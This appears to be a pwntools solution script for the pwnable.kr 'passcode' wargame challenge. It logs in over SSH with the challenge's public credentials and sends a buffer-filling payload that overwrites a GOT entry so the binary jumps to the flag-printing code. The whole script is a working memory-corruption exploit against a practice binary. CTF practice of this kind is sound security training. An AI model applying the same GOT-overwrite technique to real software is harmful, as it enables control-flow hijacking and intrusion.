from pwn import *
#code = bytes(asm(shellcraft.i386.linux.exit(0)))
#print(code)
#iprint(u64(code))
r = ssh(host='pwnable.kr', port=2222, user='passcode', password='guest')
p = r.process('./passcode')
#print(bytes([ord('a')] * 0x60) + p32(0x804a004))
p.writeline(bytes([ord('a')] * 0x60) + p32(0x804a004))
#print(str(0x80485d7).encode('ascii'))
p.writeline(str(0x80485d7).encode('ascii'))
p.interactive()
# the flag will be written to output
# it's the line before "Now I can safely trust you that you have credential :)"
